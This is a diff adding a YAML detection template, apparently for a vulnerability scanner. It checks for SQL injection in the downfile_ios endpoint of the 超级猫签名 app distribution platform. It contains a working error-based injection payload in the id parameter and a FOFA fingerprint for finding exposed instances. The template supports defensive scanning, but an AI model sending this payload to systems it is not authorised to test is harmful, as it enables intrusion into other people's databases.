@@ -1,0 +1,17 @@
+id: poc-yaml-cat-signature-app-downfile-ios-sqi
+info:
+  name: 超级猫签名APP分发平台 downfile_ios 存在SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 超级猫签名APP分发平台
+  fofa: /themes/97013266/public/static/css/pc.css
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /user/install/downfile_ios?id=1')+AND+GTID_SUBSET(CONCAT((SELECT(md5({{.t1}})))),3119)--+bdmV
+  expression: "status_code == 500 && \ncontains(body,t2) && \ncontains(body,\"General\
+    \ error\")\n"
+transport: http
